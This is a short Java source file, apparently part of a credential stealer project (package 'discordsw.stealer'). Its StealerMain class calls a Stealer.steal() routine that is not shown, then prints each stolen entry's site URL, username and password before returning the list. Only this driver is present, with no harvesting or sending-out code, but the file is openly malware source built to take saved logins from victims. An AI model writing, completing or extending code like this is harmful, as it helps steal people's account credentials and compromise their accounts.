package me.mafrans.discordsw.stealer;

import java.util.List;

public class StealerMain {

    public static List<Data> run() {
        List<Data> dt = Stealer.steal();
        for(Data data : dt)
        {
            System.out.println("Site URL: " + data.siteURL);
            System.out.println("Username: " + data.username);
            System.out.println("Password: " + data.password);
            System.out.println("");
        }

        return dt;
    }
}
